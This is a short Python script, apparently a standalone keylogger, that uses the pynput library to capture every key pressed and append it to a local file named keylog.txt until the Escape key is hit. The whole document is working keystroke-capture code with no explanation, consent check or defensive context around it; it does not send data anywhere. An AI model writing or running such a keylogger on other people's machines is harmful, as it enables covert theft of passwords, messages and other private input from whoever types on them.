from pynput import keyboard
log_file = "keylog.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

def on_press(key):
    try:
        if key == keyboard.Key.esc:
            return False
        else:
            write_to_file(key.char)
    except AttributeError:
        write_to_file(key)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
